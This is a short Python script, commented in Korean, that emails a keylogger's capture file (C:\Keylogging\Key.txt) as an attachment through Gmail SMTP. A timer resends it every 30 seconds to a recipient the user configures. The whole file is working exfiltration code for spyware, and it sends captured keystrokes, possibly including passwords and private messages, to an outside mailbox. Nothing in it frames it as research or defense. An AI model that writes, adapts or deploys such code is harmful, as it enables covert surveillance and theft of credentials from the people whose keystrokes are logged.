import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

import os
import time
import schedule

import threading

def autoEmailSend():

        # 지메일 아이디,비번 입력하기
        email_user = ''         #<ID> 본인 계정 아이디 입력
        email_password = ''        #<PASSWORD> 본인 계정 암호 입력
        email_send = ''         # <받는곳주소> 수신자 이메일 abc@abc.com 형태로 입력

        # 제목 입력
        subject = 'Keylogging Automatic Report' 

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        # 본문 내용 입력
        body = 'Keylogging Report at ' + time.strftime('%c', time.localtime(time.time()))
        msg.attach(MIMEText(body,'plain'))

        #첨부파일 경로/이름 지정하기
        filename='C:\\Keylogging\\Key.txt'  
        attachment = open(filename,'rb')

        part = MIMEBase('application','octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment", filename= os.path.basename(filename))
        msg.attach(part)

        text = msg.as_string()
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email_user,email_password)

        server.sendmail(email_user,email_send,text)
        server.quit()

        print("Mail Sended at " + time.strftime('%c', time.localtime(time.time())))

        #실제로 메일이 작성해서 보내는데까지 시간을 반영하면 실험상 1분 정도가 걸림
        threading.Timer(30.0, autoEmailSend).start()

#최초 1회는 시작을 해 주어야 계속 동작
autoEmailSend()